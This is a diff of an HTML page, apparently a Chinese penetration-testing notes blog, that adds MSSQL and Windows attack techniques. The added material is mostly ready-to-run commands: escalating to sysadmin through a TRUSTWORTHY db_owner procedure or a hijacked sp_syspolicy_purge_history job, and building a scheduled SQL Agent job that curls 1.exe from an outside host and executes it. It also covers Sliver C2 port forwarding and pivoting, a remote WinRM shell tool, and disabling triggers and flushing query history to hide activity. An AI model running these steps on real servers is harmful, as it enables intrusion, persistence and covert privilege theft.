@@ -288,6 +288,7 @@
         <li><a href="#本地powershell">本地powershell</a></li>
         <li><a href="#远程evil-winrm">远程evil-winrm</a></li>
         <li><a href="#远程evil-winrm-py">远程evil-winrm-py</a></li>
+        <li><a href="#远程winrmexecpy更兼容ssl也就是https协议的winrmshell">远程winrmexec.py（更兼容ssl，也就是https协议的winrmshell）</a></li>
       </ul>
     </li>
     <li><a href="#impacket-工具集中用于远程命令执行的脚本">Impacket 工具集中用于远程命令执行的脚本</a>
@@ -681,7 +682,7 @@
 
 
                 <time class="article-time--reading">
-                    48 minute read
+                    50 minute read
                 </time>
             </div>
         
@@ -1166,6 +1167,11 @@ nxc</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>evil-winrm-py -i $domain -S -k &lt;私钥&gt; -c &lt;公钥&gt;
 </span></span><span style="display:flex;"><span>例如
 </span></span><span style="display:flex;"><span>evil-winrm-py -i timelapse.htb -S -k legacyy_dev_auth.key -c legacyy_dev_auth.crt
+</span></span></code></pre></div><h3 id="远程winrmexecpy更兼容ssl也就是https协议的winrmshell">远程winrmexec.py（更兼容ssl，也就是https协议的winrmshell）
+</h3><p>下载</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>https://raw.githubusercontent.com/ozelis/winrmexec/main/winrmexec.py
+</span></span></code></pre></div><p>使用(与impackt包一样的权限传递)</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>python3 winrm.py -ssl -port <span style="color:#ae81ff">5986</span> -k $doamin/$user@$ip -no-pass
 </span></span></code></pre></div><h2 id="impacket-工具集中用于远程命令执行的脚本">Impacket 工具集中用于远程命令执行的脚本
 </h2><div class="table-wrapper"><table>
   <thead>
@@ -1459,7 +1465,7 @@ nxc</p>
 </span></span></code></pre></div><h3 id="带内sliver端口转发">带内sliver端口转发
 </h3><p>sliver支持对载荷进行端口正向转发或者反向转发，但是都需要先进入载荷会话</p>
 <p>正向转发</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>portfwd add --remote 192.168.176.129:445 --bind 127.0.0.1:445
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>portfwd add --remote 172.22.6.25:3389 --bind 0.0.0.0:44544
 </span></span><span style="display:flex;"><span><span style="color:#75715e"># 将本地的445流量导向到远程192.168.176.129:445</span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e">#可以再次键入portfwd查看当前端口转发的会话，也意味着我们可以进行多次端口转发</span>
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span><span style="color:#f92672">[</span>server<span style="color:#f92672">]</span> sliver <span style="color:#f92672">(</span>CHEMICAL_FOWL<span style="color:#f92672">)</span> &gt; portfwd
@@ -1732,7 +1738,7 @@ nxc</p>
 <h3 id="sliver多级网络部署">sliver多级网络部署
 </h3><p>sliver载荷在会话模式下带有pivot命令，允许载荷启动监听，用于在多网段情况下的渗透</p>
 <p>首先需要一个进入一个载荷会话</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>pivot tcp --lport <span style="color:#ae81ff">443</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>pivots tcp --lport <span style="color:#ae81ff">443</span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e"># 这样会在这台我们已经控制的机器监听443端口</span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e"># 再次输入pivot可以查看已启动的监听</span>
 </span></span></code></pre></div><p>之后生成其对应的载荷,如下</p>
@@ -1807,7 +1813,7 @@ nxc</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span><span style="color:#66d9ef">select</span> @@servername
 </span></span></code></pre></div><p>查询当前用户名称</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span><span style="color:#66d9ef">select</span> suser_name<span style="color:#f92672">()</span>;
-</span></span></code></pre></div><p>查询当前权限</p>
+</span></span></code></pre></div><p>查询当前服务器级权限</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>SELECT entity_name, permission_name FROM fn_my_permissions<span style="color:#f92672">(</span>NULL, <span style="color:#e6db74">&#39;SERVER&#39;</span><span style="color:#f92672">)</span>;
 </span></span></code></pre></div><p>列出数据库所有登陆账户</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>SELECT name FROM master..syslogins
@@ -1816,11 +1822,14 @@ nxc</p>
 </span></span></code></pre></div><p>查找自身模拟权限</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>SELECT grantor.name AS Grantor, grantee.name AS Grantee, permission_name, state_desc FROM sys.server_permissions sp JOIN sys.server_principals grantor ON sp.grantor_principal_id <span style="color:#f92672">=</span> grantor.principal_id JOIN sys.server_principals grantee ON sp.grantee_principal_id <span style="color:#f92672">=</span> grantee.principal_id WHERE permission_name <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;IMPERSONATE&#39;</span>;
 </span></span></code></pre></div><p>查找模拟用户</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>SQL <span style="color:#f92672">(</span>SIGNED<span style="color:#ae81ff">\m</span>ssqlsvc  dbo@master<span style="color:#f92672">)</span>&gt; enum_impersonate 
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>enum_impersonate 
 </span></span></code></pre></div><p>尝试模拟sa</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>EXECUTE AS LOGIN <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;sa&#39;</span>;
 </span></span></code></pre></div><p>列出所有数据库</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>SELECT name FROM sys.databases;
+</span></span></code></pre></div><p>查询数据库级权限(需要进入对应数据库)</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>use $db
+</span></span><span style="display:flex;"><span>SELECT * FROM fn_my_permissions<span style="color:#f92672">(</span>NULL,<span style="color:#e6db74">&#39;DATABASE&#39;</span><span style="color:#f92672">)</span>;
 </span></span></code></pre></div><p>列出所有表</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>先使用对应数据库
 </span></span><span style="display:flex;"><span>use $dbname
@@ -1885,35 +1894,78 @@ nxc</p>
 </span></span></code></pre></div><p>或者</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>use_link SERVER2
 </span></span><span style="display:flex;"><span>xp_cmdshell hostname
-</span></span></code></pre></div><h4 id="db_ddladmin-滥用劫持定时计划提权sa">db_ddladmin 滥用（劫持定时计划提权sa）
-</h4><p>需求：需要有db_ddladmin权限</p>
-<p>原理：db_ddladmin 角色允许用户修改（ALTER）数据库内的任何 DDL（数据定义语言）对象，包括存储过程。存储过程 msdb.dbo.sp_syspolicy_purge_history 是一个系统内部存储过程，它默认会被 SQL Server Agent 的一个内置作业（名为 syspolicy_purge_history）定期执行（通常是每天）。更重要的是，这个 SQL Server Agent 作业在执行时，是以拥有高权限（通常是 sysadmin）的用户身份运行的。</p>
-<p>首先创建登陆连接</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>USE <span style="color:#f92672">[</span>master<span style="color:#f92672">]</span>
-</span></span><span style="display:flex;"><span>CREATE LOGIN <span style="color:#f92672">[</span>link<span style="color:#f92672">]</span> WITH PASSWORD<span style="color:#f92672">=</span>N<span style="color:#e6db74">&#39;Password1&#39;</span>, DEFAULT_DATABASE<span style="color:#f92672">=[</span>master<span style="color:#f92672">]</span>, CHECK_EXPIRATION<span style="color:#f92672">=</span>OFF, CHECK_POLICY<span style="color:#f92672">=</span>OFF
-</span></span></code></pre></div><p>向db_ddladmin 角色添加登录链接</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>USE <span style="color:#f92672">[</span>msdb<span style="color:#f92672">]</span>
-</span></span><span style="display:flex;"><span>CREATE USER <span style="color:#f92672">[</span>link<span style="color:#f92672">]</span> FOR LOGIN <span style="color:#f92672">[</span>link<span style="color:#f92672">]</span>
-</span></span><span style="display:flex;"><span>USE <span style="color:#f92672">[</span>msdb<span style="color:#f92672">]</span>
-</span></span><span style="display:flex;"><span>ALTER ROLE <span style="color:#f92672">[</span>db_ddladmin<span style="color:#f92672">]</span> ADD MEMBER <span style="color:#f92672">[</span>link<span style="color:#f92672">]</span>
-</span></span></code></pre></div><p>修改每日定时清除任务为提权指令</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>use <span style="color:#f92672">[</span>msdb<span style="color:#f92672">]</span>
-</span></span><span style="display:flex;"><span>ALTER PROCEDURE <span style="color:#f92672">[</span>dbo<span style="color:#f92672">]</span>.<span style="color:#f92672">[</span>sp_syspolicy_purge_history<span style="color:#f92672">]</span> AS BEGIN ALTER SERVER ROLE <span style="color:#f92672">[</span>sysadmin<span style="color:#f92672">]</span> ADD MEMBER <span style="color:#f92672">[</span>link<span style="color:#f92672">]</span> END
-</span></span></code></pre></div><p>此后当定时任务执行，link会获得sa权限</p>
-<h4 id="后渗透常用语法不是所有权限都需要sa但是默认具备">后渗透常用语法（不是所有权限都需要sa，但是默认具备）
+</span></span></code></pre></div><h4 id="关于trustworthy-on开启的db_oner提权sa记录">关于TRUSTWORTHY ON开启的db_oner提权sa记录
+</h4><p>要求很多基本上遇不到只是简单记录</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>需要我们是一个数据库的db_oner
+</span></span><span style="display:flex;"><span>需要数据库oner为sa
+</span></span><span style="display:flex;"><span>需要TRUSTWORTHY 开启on参数（sa才能设置）
+</span></span></code></pre></div><p>提权思路，创建一个存储过程指定用数据库oner权限执行，从而以数据库权限劫持服务器权限</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span><span style="color:#75715e"># 以db_oner权限创建恶意储存</span>
+</span></span><span style="display:flex;"><span>CREATE PROCEDURE dbo.sp_elevate_privs WITH EXECUTE AS OWNER AS BEGIN EXEC sp_addsrvrolemember <span style="color:#e6db74">&#39;$user&#39;</span>, <span style="color:#e6db74">&#39;sysadmin&#39;</span>; END
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 执行恶意储存</span>
+</span></span><span style="display:flex;"><span>EXEC dbo.sp_elevate_privs
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 查看提权是否成功</span>
+</span></span><span style="display:flex;"><span>SELECT IS_SRVROLEMEMBER<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;sysadmin&#39;</span><span style="color:#f92672">)</span>;
+</span></span></code></pre></div><h4 id="后渗透常用语法不是所有权限都需要sa但是默认具备">后渗透常用语法（不是所有权限都需要sa，但是默认具备）
 </h4><p>清理最近查询记录</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>DBCC FLUSHPROCINDB<span style="color:#f92672">(</span>DB_ID<span style="color:#f92672">())</span>;
-</span></span></code></pre></div><p>创建一个用户并赋予sa权限</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>创建
-</span></span><span style="display:flex;"><span>CREATE LOGIN $user WITH PASSWORD <span style="color:#f92672">=</span><span style="color:#e6db74">&#39;$pass&#39;</span>;
-</span></span><span style="display:flex;"><span>赋予
-</span></span><span style="display:flex;"><span>EXEC sp_addsrvrolemember <span style="color:#e6db74">&#39;$user&#39;</span>, <span style="color:#e6db74">&#39;sysadmin&#39;</span>;
+</span></span></code></pre></div><p>查询服务账户</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>SELECT servicename, service_account FROM sys.dm_server_services;
 </span></span></code></pre></div><p>查询触发器并关闭</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>查询
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">select</span> name from sys.server_triggers;
 </span></span><span style="display:flex;"><span>关闭
 </span></span><span style="display:flex;"><span>disable trigger $name on all server
-</span></span></code></pre></div><h3 id="无数据库用户密码使用kerbores本地登陆域内数据库">无数据库用户密码使用kerbores本地登陆域内数据库
+</span></span></code></pre></div><h4 id="创建一个用户并赋予sa权限默认具备sa">创建一个用户并赋予sa权限（默认具备sa）
+</h4><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>创建
+</span></span><span style="display:flex;"><span>CREATE LOGIN $user WITH PASSWORD <span style="color:#f92672">=</span><span style="color:#e6db74">&#39;$pass&#39;</span>;
+</span></span><span style="display:flex;"><span>赋予
+</span></span><span style="display:flex;"><span>EXEC sp_addsrvrolemember <span style="color:#e6db74">&#39;$user&#39;</span>, <span style="color:#e6db74">&#39;sysadmin&#39;</span>;
+</span></span></code></pre></div><h4 id="作业与调度相关利用以下内容除了db_ddladmin滥用部分默认具备sa权限">作业与调度相关利用(以下内容除了db_ddladmin滥用部分默认具备sa权限)
+</h4><p>所有调度默认再msdb中查询更改以及使用，其利用mssql-agent服务账户自动运行作业而不是mssql-server服务账户，注意mssql-agent服务默认是不启用或者需要手动开启的，以下大部分内容仅仅在其以及开启使用的情况下有用.且以下命令全部以impacket-client执行为准。</p>
+<p>一句话概括作业就是任务，调度就是定时处理，而储存过程是数据库命令集合的脚本，一般是调度用来自动执行作业，而作业内置了cmd或者powershell等或者储存过程</p>
+<p>查询agent是否在运行</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>USE master; SELECT servicename, service_account, status, status_desc FROM sys.dm_server_services;
+</span></span></code></pre></div><p>一句话查询所有调度任务</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>USE msdb; SELECT j.name AS JobName, s.name AS ScheduleName, s.schedule_id, s.enabled, s.freq_type, s.freq_interval, s.freq_subday_type, s.freq_subday_interval, s.active_start_time FROM dbo.sysjobs j LEFT JOIN dbo.sysjobschedules js ON j.job_id<span style="color:#f92672">=</span>js.job_id LEFT JOIN dbo.sysschedules s ON js.schedule_id<span style="color:#f92672">=</span>s.schedule_id ORDER BY j.name;
+</span></span></code></pre></div><p>一句话查询所有作业及步骤</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>USE msdb; SELECT j.job_id, j.name AS job_name, SUSER_SNAME<span style="color:#f92672">(</span>j.owner_sid<span style="color:#f92672">)</span> AS job_owner, s.step_id, s.step_name, s.subsystem, s.database_name, s.command FROM dbo.sysjobs j JOIN dbo.sysjobsteps s ON j.job_id <span style="color:#f92672">=</span> s.job_id ORDER BY j.name, s.step_id;
+</span></span></code></pre></div><h5 id="创建恶意作业及调度">创建恶意作业及调度
+</h5><p>首先创建作业并生成作业id（后续命令作业id示例为52D9FAA6-02B7-40E6-9778-D5D311737BEC）</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>DECLARE @JobID UNIQUEIDENTIFIER; EXEC msdb.dbo.sp_add_job @job_name <span style="color:#f92672">=</span> N<span style="color:#e6db74">&#39;Test_Job_Final_Success&#39;</span>, @enabled <span style="color:#f92672">=</span> 1, @description <span style="color:#f92672">=</span> N<span style="color:#e6db74">&#39;test&#39;</span>, @owner_login_name <span style="color:#f92672">=</span> N<span style="color:#e6db74">&#39;sa&#39;</span>, @job_id <span style="color:#f92672">=</span> @JobID OUTPUT; SELECT N<span style="color:#e6db74">&#39;Test_Job_Final_Success&#39;</span> AS Created_Job_Name, @JobID AS Created_Job_ID;
+</span></span></code></pre></div><p>将生成的作业id绑定一个cmd指令，此处不需要设置指定可用命令因为我们需要修改两次（一次下载，一次执行）</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>EXEC msdb.dbo.sp_add_jobstep @job_id <span style="color:#f92672">=</span> N<span style="color:#e6db74">&#39;52D9FAA6-02B7-40E6-9778-D5D311737BEC&#39;</span>, @step_name <span style="color:#f92672">=</span> N<span style="color:#e6db74">&#39;Log_Execution_Step_1&#39;</span>, @step_id <span style="color:#f92672">=</span> 1, @subsystem <span style="color:#f92672">=</span> N<span style="color:#e6db74">&#39;CmdExec&#39;</span>, @command <span style="color:#f92672">=</span> N<span style="color:#e6db74">&#39;curl http://test-ip&#39;</span>, @on_success_action <span style="color:#f92672">=</span> 1, @on_fail_action <span style="color:#f92672">=</span> 2;
+</span></span></code></pre></div><p>创建启动命令</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>EXEC msdb.dbo.sp_update_job @job_id <span style="color:#f92672">=</span> N<span style="color:#e6db74">&#39;52D9FAA6-02B7-40E6-9778-D5D311737BEC&#39;</span>, @start_step_id <span style="color:#f92672">=</span> 1;
+</span></span></code></pre></div><p>创建每五分钟执行一次的调度，并生成调度id(可选，不想手动触发的话就需要,后续命令调度id示例为9)</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>DECLARE @ScheduleID INT; EXEC msdb.dbo.sp_add_schedule @schedule_name <span style="color:#f92672">=</span> N<span style="color:#e6db74">&#39;Every_5_Minutes_Fixed&#39;</span>, @enabled <span style="color:#f92672">=</span> 1, @freq_type <span style="color:#f92672">=</span> 4, @freq_interval <span style="color:#f92672">=</span> 1, @freq_subday_type <span style="color:#f92672">=</span> 4, @freq_subday_interval <span style="color:#f92672">=</span> 5, @active_start_time <span style="color:#f92672">=</span> 000000, @active_end_time <span style="color:#f92672">=</span> 235959, @schedule_id <span style="color:#f92672">=</span> @ScheduleID OUTPUT; SELECT N<span style="color:#e6db74">&#39;Every_5_Minutes_Fixed&#39;</span> AS ScheduleName, @ScheduleID AS ScheduleID;
+</span></span></code></pre></div><p>将调度绑定至作业(可选，不想手动触发的话就需要)</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>EXEC msdb.dbo.sp_attach_schedule @job_id <span style="color:#f92672">=</span> N<span style="color:#e6db74">&#39;52D9FAA6-02B7-40E6-9778-D5D311737BEC&#39;</span>, @schedule_id <span style="color:#f92672">=</span> 9;
+</span></span></code></pre></div><p>确认调度信息</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>SELECT j.name AS JobName, j.enabled AS JobStatus, s.name AS ScheduleName, s.schedule_id AS ScheduleID, s.freq_subday_interval AS IntervalMinutes FROM msdb.dbo.sysjobs j JOIN msdb.dbo.sysjobschedules js ON j.job_id <span style="color:#f92672">=</span> js.job_id JOIN msdb.dbo.sysschedules s ON js.schedule_id <span style="color:#f92672">=</span> s.schedule_id WHERE j.job_id <span style="color:#f92672">=</span> N<span style="color:#e6db74">&#39;52D9FAA6-02B7-40E6-9778-D5D311737BEC&#39;</span> AND s.schedule_id <span style="color:#f92672">=</span> 9;
+</span></span></code></pre></div><p>绑定作业服务器为本地</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>EXEC msdb.dbo.sp_add_jobserver @job_id <span style="color:#f92672">=</span> N<span style="color:#e6db74">&#39;52D9FAA6-02B7-40E6-9778-D5D311737BEC&#39;</span>, @server_name <span style="color:#f92672">=</span> N<span style="color:#e6db74">&#39;(local)&#39;</span>;
+</span></span></code></pre></div><p>修改作业任务为下载指令(下载与执行需要分开)</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>EXEC msdb.dbo.sp_update_jobstep @job_id <span style="color:#f92672">=</span> N<span style="color:#e6db74">&#39;52D9FAA6-02B7-40E6-9778-D5D311737BEC&#39;</span>, @step_id <span style="color:#f92672">=</span> 1, @command <span style="color:#f92672">=</span> N<span style="color:#e6db74">&#39;curl http://192.168.174.3/1.exe -o c:\windows\tasks\1.exe&#39;</span>;
+</span></span></code></pre></div><p>等待5分钟的调度执行，或者直接执行</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>EXEC msdb.dbo.sp_start_job @job_id <span style="color:#f92672">=</span> N<span style="color:#e6db74">&#39;52D9FAA6-02B7-40E6-9778-D5D311737BEC&#39;</span>;
+</span></span></code></pre></div><p>修改作业任务为执行指令</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>EXEC msdb.dbo.sp_update_jobstep @job_id <span style="color:#f92672">=</span> N<span style="color:#e6db74">&#39;52D9FAA6-02B7-40E6-9778-D5D311737BEC&#39;</span>, @step_id <span style="color:#f92672">=</span> 1, @command <span style="color:#f92672">=</span> N<span style="color:#e6db74">&#39;c:\windows\tasks\1.exe&#39;</span>;
+</span></span></code></pre></div><p>等待5分钟的调度执行，或者直接执行</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>EXEC msdb.dbo.sp_start_job @job_id <span style="color:#f92672">=</span> N<span style="color:#e6db74">&#39;52D9FAA6-02B7-40E6-9778-D5D311737BEC&#39;</span>;
+</span></span></code></pre></div><p>无论是直接执行还是任务执行，获得的权柄都不是mssql服务账号，而是NT Service\SQLAgent$MSSQL</p>
+<h5 id="msdb中db_ddladmin关于调度的特殊利用提权sa">msdb中db_ddladmin关于调度的特殊利用（提权sa）
+</h5><p>条件很苛刻，需要我们是msdb中的db_ddladmin（数据库级权限），可以修改储存过程</p>
+<p>msdb中的db_ddladmin可以在agent服务启动时，更改所有已经在运行，且作业步骤指定msdb中的存储过程的调度，让调度任务自动帮我们提权（以dbo权限执行命令）</p>
+<p>最简单的就是修改默认每天执行一次的sp_syspolicy_purge_history</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>use <span style="color:#f92672">[</span>msdb<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>ALTER PROCEDURE <span style="color:#f92672">[</span>dbo<span style="color:#f92672">]</span>.<span style="color:#f92672">[</span>sp_syspolicy_purge_history<span style="color:#f92672">]</span> AS BEGIN ALTER SERVER ROLE <span style="color:#f92672">[</span>sysadmin<span style="color:#f92672">]</span> ADD MEMBER <span style="color:#f92672">[</span>$user<span style="color:#f92672">]</span> END
+</span></span></code></pre></div><p>执行完毕后会自动将指定用户添加入sysadmin组，如果出现以下报错，忽略即可，修改是正常的</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>INFO<span style="color:#f92672">(</span>dc01<span style="color:#ae81ff">\M</span>SSQL<span style="color:#f92672">)</span>: Line 1: 警告: 已为 过程<span style="color:#e6db74">&#39;dbo.sp_syspolicy_purge_history&#39;</span> 禁用 <span style="color:#e6db74">&#39;is_ms_shipped&#39;</span> 属性，因为您无权创建或更改具有此属性的对象。
+</span></span></code></pre></div><p>可以通过如下命令查询是否正常修改</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>EXEC sp_helptext <span style="color:#e6db74">&#39;msdb.dbo.sp_syspolicy_purge_history&#39;</span>;
+</span></span></code></pre></div><p>等待运行时间运行，我们的用户会获得sa权限，注意默认运行时间是每日晚八点</p>
+<h3 id="无数据库用户密码使用kerbores本地登陆域内数据库">无数据库用户密码使用kerbores本地登陆域内数据库
 </h3><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-csharp" data-lang="csharp"><span style="display:flex;"><span><span style="color:#66d9ef">using</span> System;
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">using</span> System.Data.SqlClient;
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">using</span> System.IO;
@@ -2461,7 +2513,7 @@ nxc</p>
 </span></span></code></pre></div><p>需要自行编译</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>.\EfsPotato.exe <span style="color:#e6db74">&#34;command&#34;</span>
 </span></span></code></pre></div><h4 id="附记-服务账户关闭特权强行开启">附记 服务账户关闭特权强行开启
